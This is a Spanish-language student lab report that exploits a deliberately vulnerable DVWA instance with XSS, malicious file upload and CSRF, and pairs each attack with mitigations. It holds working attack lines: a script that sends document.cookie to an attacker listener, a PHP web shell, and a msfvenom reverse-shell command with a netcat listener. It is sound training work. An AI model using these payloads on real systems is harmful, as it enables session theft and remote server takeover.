# INFORME #1 - Gestion de Vulnerabilidades en Aplicaciones

*DVWA: XSS Reflejado | XSS Almacenado | Upload Backdoor | CSRF*

---

| Campo | Detalle |
|---|---|
| **Asignatura** | Gestion de Vulnerabilidades en Aplicaciones |
| **Programa** | Especializacion en Ciberseguridad |
| **Docente** | Javier Mauricio Duran Vasquez |
| **Estudiante** | Daniel Alejandro Aguirre Ceballos |
| **Entorno** | Kali Linux + Metasploitable (DVWA) |
| **Fecha** | 28 de febrero de 2026 |

---

## Entorno de trabajo

| Campo | Detalle |
|---|---|
| **Atacante** | Kali Linux - IP: 127.0.0.1 - Prompt: kali@kali:~$ |
| **Victima** | Metasploitable con DVWA - IP: 127.0.0.1 |
| **Nivel DVWA** | Low |
| **Herramientas** | Firefox, Netcat, msfvenom, Weevely |

---

## Vulnerabilidad 1 - XSS Reflejado (Cross-Site Scripting Reflected)

### 1. Descripcion de la vulnerabilidad

El XSS Reflejado es una vulnerabilidad en la que el atacante inyecta codigo JavaScript malicioso en un parametro de la solicitud HTTP.

---

### 2. Causas de la vulnerabilidad

**a. Ausencia de validaciones**

**b. Errores de logica**

**c. Manejo inadecuado de entradas y salidas**

---

### 3. Mecanismo de ataque - Robo de cookie y secuestro de sesion

**Objetivo:** Robar la cookie de sesion de la victima y cargarla en el navegador del atacante para iniciar sesion sin credenciales.

**Paso 1 - Activar Listener**

Activamos el listener en la consola de kali:

`
python3 -m http.server 8888
`

**Paso 2 - Payload XSS para robar cookie**

Imagen1 formulario inicial

Utilizamos el siguiente payload:

`
<script>new Image().src="http://127.0.0.1:8888/?c="+document.cookie;</script>
`

Imagen2 Obtener cookie en la terminal

**Paso 3 - Recepcion de la cookie en el listener del atacante:**

`
127.0.0.1 - "GET /?cookie=PHPSESSID=18ff22346f0f579ba5604b1bc150c45f HTTP/1.1" 200 -
`

**Paso 4 - Inyeccion de cookie en el navegador atacante (consola F12):**

Imagen3 Cambiar cookie en la consola f12

---

### 4. Propuesta de mitigacion

- Validacion del lado del servidor con listas blancas de caracteres permitidos.
- Sanitizacion con DOMPurify (JS) o HTMLPurifier (PHP).

---

## Vulnerabilidad 2 - XSS Almacenado (Cross-Site Scripting Stored)

### 1. Descripcion de la vulnerabilidad

El XSS Almacenado (Persistente) es una variante del XSS en la que el payload malicioso es guardado permanentemente en la base de datos.

---

### 2. Causas de la vulnerabilidad

**a. Ausencia de validaciones**

**b. Errores de logica**

La aplicacion trata los campos del formulario como datos confiables sin distinguir entre texto plano y codigo HTML/JavaScript.

**c. Manejo inadecuado de entradas y salidas**

---

### 3. Mecanismo de ataque - Redireccion persistente

**Objetivo:** Inyectar en la seccion de foros un payload que redirija automaticamente a todos los usuarios a un sitio externo.

**Paso 1 - Payload de redireccion (campo Message):**

Imagen4: Como no alcanza la cantidad de caracteres, con f12 le aumentamos los caracteres

Imagen5: Cambiamos maxlenght de 50 a 100 y ejecutamos el siguiente payload:

`
<script>window.location.href="https://google.com";</script>
`

Luego de cargar este payload en Message. La pagina de xss storage siempre redirigira a google como se muestra en la imagen6.

Imagen6: XSS redirigiendo a google.

Finalmente, para restaurar se debe entrar a mariaDB:

`
sudo mysql -u root -p
password = ""
USE dvwa;
UPDATE guestbook SET comment = REPLACE(comment, '<script>', '') WHERE comment LIKE '%<script>%';
`

---

### 4. Propuesta de mitigacion

- Sanitizacion en almacenamiento: strip_tags() y htmlspecialchars() antes de insertar en BD.
- Sanitizacion en recuperacion: htmlentities() al extraer datos para mostrarlos.
- Validacion de longitud maxima de campos.

---

## Vulnerabilidad 3 - Upload Backdoor (File Upload Malicioso)

### 1. Descripcion de la vulnerabilidad

La vulnerabilidad de subida de archivos maliciosos ocurre cuando una aplicacion permite cargar archivos al servidor sin validar correctamente el tipo, extension o contenido.

---

### 2. Causas de la vulnerabilidad

**a. Ausencia de validaciones**

**b. Errores de logica**

**c. Manejo inadecuado de entradas**

---

### 3. Mecanismo de ataque - Shell reversa PHP

**Objetivo:** Subir un archivo PHP malicioso y obtener una consola de sistema operativo en el servidor.

**Paso 1 - Crear PHP simple:**

`
echo '<?php system($_GET["cmd"]); ?>' > danielaguirre.php
`

**Paso 2 - Crear reverse shell con msfvenom:**

`
kali@kali:~$ msfvenom -p php/reverse_php LHOST=127.0.0.1 LPORT=4444 -f raw > danielaguirre.php
`

**Paso 3 - Iniciar listener Netcat:**

`
kali@kali:~$ nc -lvnp 4444
`

**Paso 4 - Subir el archivo por el formulario DVWA y acceder a:**

`
http://127.0.0.1/dvwa/hackable/uploads/danielaguirre.php
`

---

### 4. Propuesta de mitigacion

- Lista blanca de extensiones: permitir solo .jpg, .png, .gif.
- Renombrar archivos con nombre aleatorio al guardar.

---

## Vulnerabilidad 4 - CSRF (Cross-Site Request Forgery)

### 1. Descripcion de la vulnerabilidad

CSRF es un ataque en el que el atacante induce a una victima autenticada a realizar una accion no deseada en una aplicacion web. El navegador envia automaticamente las cookies de sesion con cada solicitud, por lo que la aplicacion cree que la peticion es legitima aunque haya sido forjada desde otro sitio.

---

### 2. Causas de la vulnerabilidad

**a. Ausencia de validaciones**

**b. Errores de logica**

La aplicacion no exige que la peticion provenga del propio sitio ni que el usuario haya iniciado explicitamente la accion.

**c. Manejo inadecuado de entradas**

Los parametros sensibles viajan en la URL (metodo GET), facilitando la construccion de enlaces maliciosos.

---

### 3. Mecanismo de ataque - Cambio de contrasena de la victima

**Objetivo:** Mostrar el proceso para falsificar una peticion en sitios cruzados que le permita modificar un dato, parametro, configuracion o credencial de la victima.

---

## Reflexion Personal

Durante el desarrollo de este laboratorio, sobre la plataforma DVWA, se evidencio de manera practica como vulnerabilidades aparentemente simples pueden derivar en compromisos criticos de la seguridad de un sistema real.

El XSS Reflejado y el XSS Almacenado se originan en la misma causa raiz: confiar en el input del usuario sin codificacion de salida. Sin embargo, el impacto del XSS Almacenado es significativamente mayor por su persistencia y escala.

El laboratorio de Upload Backdoor fue el de mayor impacto tangible: en cuestion de minutos se obtuvo ejecucion remota de comandos sobre el servidor victima, lo que en un entorno productivo implicaria el compromiso total del sistema.

En terminos de aplicabilidad profesional, estas practicas refuerzan la importancia de integrar la seguridad desde las etapas tempranas del desarrollo y educar a los equipos de desarrollo en los principios de OWASP.

---

## Referencias

1. OWASP Foundation. (2021). OWASP Top Ten 2021. https://owasp.org/www-project-top-ten/
2. MITRE Corporation. (2024). CWE-79: Cross-site Scripting. https://cwe.mitre.org/data/definitions/79.html
3. Stuttard, D., & Pinto, M. (2011). The Web Application Hackers Handbook. Wiley.
4. Duran Vasquez, J. M. (2026). Guia de Trabajo Practico No. 1. ITM.